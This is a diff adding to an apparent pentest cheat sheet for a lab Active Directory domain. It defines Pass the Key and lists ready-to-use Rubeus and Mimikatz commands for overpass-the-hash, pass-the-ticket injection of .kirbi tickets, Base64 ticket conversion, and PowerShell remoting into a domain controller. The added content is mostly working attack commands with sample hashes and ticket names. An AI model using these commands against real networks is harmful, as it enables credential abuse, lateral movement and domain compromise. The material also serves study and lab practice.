@@ -265,6 +265,8 @@ Rubeus.exe dump /nowrap
 
 ### Pass the Key aka. OverPass the Hash
 
+Pass the Key (also known as Overpass the Hash) is a post-exploitation technique where an attacker uses a stolen NTLM hash or AES key to request a valid Kerberos Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC).
+
 **Mimikatz**
 
 ```powershell
@@ -280,4 +282,49 @@ sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09c
 
 ```powershell
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+
+### Pass the Ticket
+
+**Rubeus**
+
+```powershell
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+
+# using kirbi file
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+# Base64 Format
+Rubeus.exe ptt /ticket:doIE1jCCB........
+```
+
+```powershell
+# Convert .kirbi to Base64 Format
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+```
+
+**Mimikatz**
+
+```powershell
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+
+# can also use
+misc::cmd
+```
+
+### PowerShell Remoting
+
+**Mimikatz**
+
+```powershell
+kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+# change powershell
+Enter-PSSession -ComputerName DC01
+```
+
+**Rubeus**
+
+```powershell
+
 ```
